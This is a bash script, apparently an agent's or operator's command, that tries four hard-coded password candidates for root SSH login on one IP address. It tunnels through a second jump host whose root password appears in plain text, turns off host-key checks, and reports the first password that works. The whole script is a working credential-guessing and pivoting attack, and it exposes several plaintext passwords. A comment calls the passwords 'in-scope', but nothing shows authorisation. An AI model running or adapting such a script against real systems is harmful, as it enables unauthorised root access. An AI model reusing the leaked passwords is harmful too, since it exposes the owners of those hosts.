set -euo pipefail
SLAVE_HOST=47.116.11.144
SLAVE_PASS='@XwDQ6H5mgMXbrGD'
# try known in-scope passwords against Tokyo sidecar root via Shanghai hop only
python3 - <<'PY' >/tmp/sidecar_pw_candidates.txt
candidates = [
    'Frank1212.',
    'Frank20021212.',
    'Frank20021212',
    'GK@Sp7z%T!s4*w5P',
]
for c in candidates:
    print(c)
PY
i=0
while IFS= read -r SIDE_PASS; do
  i=$((i+1))
  echo "=== candidate $i ==="
  out=$(sshpass -p "$SIDE_PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o ConnectionAttempts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    -o ProxyCommand="sshpass -p '$SLAVE_PASS' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -W %h:%p root@$SLAVE_HOST" \
    root@185.220.238.143 'echo SIDE_OK; hostname; date -Is; id' 2>&1 </dev/null || true)
  echo "$out" | tail -5 | sed 's/password: .*/password: <redacted>/g'
  if echo "$out" | grep -q SIDE_OK; then echo "FOUND_CANDIDATE_INDEX=$i"; exit 0; fi
done </tmp/sidecar_pw_candidates.txt
exit 1
